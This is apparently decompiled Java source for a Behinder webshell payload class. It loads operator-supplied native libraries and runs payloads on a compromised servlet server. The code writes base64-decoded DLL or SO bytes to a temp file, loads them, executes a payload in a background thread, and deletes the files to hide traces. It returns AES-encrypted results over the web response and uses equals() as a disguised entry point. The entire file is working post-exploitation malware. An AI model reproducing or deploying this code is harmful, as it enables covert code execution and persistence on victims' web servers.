package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class LoadNativeLibrary implements Runnable {
   public static String whatever;
   public static String action;
   public static String fileContent;
   public static String payload;
   public static String filePath;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;
   private String libraryPath;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var21 = false;

      ServletOutputStream so = null;
      label208: {
         try {
            var21 = true;
            this.fillContext(obj);
            if (action.equals("test")) {
               try {
                  System.load("c:/web/JavaNative.dll");
                  this.freeFile("test");
               } catch (Exception var45) {
               } catch (Error var46) {
               } finally {
                  ;
               }
            }

            if (action.equals("load")) {
               try {
                  this.loadLibrary(this.base64decode(fileContent));
                  result.put("status", "success");
                  result.put("msg", "Native库加载成功");
                  var21 = false;
               } catch (Exception var43) {
                  result.put("status", "fail");
                  result.put("msg", "Native库加载失败：" + var43.getMessage());
                  var21 = false;
               } catch (Error var44) {
                  result.put("status", "fail");
                  result.put("msg", "Native库加载失败：" + var44.getMessage());
                  var21 = false;
               }
            } else {
               String libraryPath;
               if (action.equals("execute")) {
                  try {
                     System.gc();
                     libraryPath = this.loadLibrary(this.base64decode(fileContent));
                     (new Thread(new LoadNativeLibrary(libraryPath))).start();
                     result.put("status", "success");
                     result.put("msg", "Payload加载成功");
                     var21 = false;
                  } catch (Exception var41) {
                     result.put("status", "fail");
                     result.put("msg", "Payload加载异常：" + var41.getMessage());
                     var21 = false;
                  } catch (Error var42) {
                     result.put("status", "fail");
                     result.put("msg", "Payload加载错误：" + var42.getMessage());
                     var21 = false;
                  }
               } else if (action.equals("freeFile")) {
                  try {
                     System.gc();
                     libraryPath = this.loadLibrary(this.base64decode(fileContent));
                     (new Thread(new LoadNativeLibrary(libraryPath))).start();
                     result.put("status", "success");
                     result.put("msg", "Payload加载成功");
                     var21 = false;
                  } catch (Exception var39) {
                     result.put("status", "fail");
                     result.put("msg", "Payload加载异常：" + var39.getMessage());
                     var21 = false;
                  } catch (Error var40) {
                     result.put("status", "fail");
                     result.put("msg", "Payload加载错误：" + var40.getMessage());
                     var21 = false;
                  }
               } else {
                  var21 = false;
               }
            }
            break label208;
         } catch (Exception var48) {
            var21 = false;
         } finally {
            if (var21) {
               try {
                  so = this.Response.getOutputStream();
                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.flush();
                  so.close();
               } catch (Exception var36) {
               }

            }
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var37) {
         }

         return true;
      }

      try {
         so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
      } catch (Exception var38) {
      }

      return true;
   }

   private boolean isWindows() {
      return System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0;
   }

   public String loadLibrary(byte[] fileContent) throws Exception {
      String libSuffix = System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0 ? ".dll" : ".so";
      String libPrefix = UUID.randomUUID().toString();
      String tempDir = System.getProperty("java.io.tmpdir");
      File library = new File(tempDir + File.separator + libPrefix + libSuffix);
      library.deleteOnExit();
      if (this.Session.getAttribute("nativeLibs") == null) {
         List libs = new ArrayList();
         libs.add(library.getAbsolutePath());
         this.Session.setAttribute("nativeLibs", libs);
      } else {
         List libs = (List)this.Session.getAttribute("nativeLibs");
         Iterator var7 = libs.iterator();

         while(var7.hasNext()) {
            String libPath = (String)var7.next();
            (new File(libPath)).delete();
         }

         libs.add(library.getAbsolutePath());
      }

      FileOutputStream output = new FileOutputStream(library, false);
      output.write(fileContent);
      output.flush();
      output.close();
      System.load(library.getAbsolutePath());
      return library.getAbsolutePath();
   }

   public void execute(byte[] payload) {
   }

   public LoadNativeLibrary() {
   }

   public LoadNativeLibrary(String libraryPath) {
      this.libraryPath = libraryPath;
   }

   public void run() {
      try {
         if (action.equals("freeFile")) {
            File libFile = new File(filePath);
            String libFileName = libFile.getName();
            this.freeFile(libFileName);
            Thread.sleep(500L);
            libFile.delete();
         } else if (action.equals("execute")) {
            this.load(this.base64decode(payload));
         }
      } catch (Exception var11) {
      } finally {
         if (this.isWindows()) {
            this.selfUnload(this.libraryPath);
         }

         try {
            Thread.sleep(500L);
         } catch (InterruptedException var10) {
         }

         (new File(this.libraryPath)).delete();
      }

   }

   public native void inject(byte[] var1);

   public native int load(byte[] var1);

   public native void freeFile(String var1);

   public native void selfUnload(String var1);

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private String base64encode(String clearText) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }
}
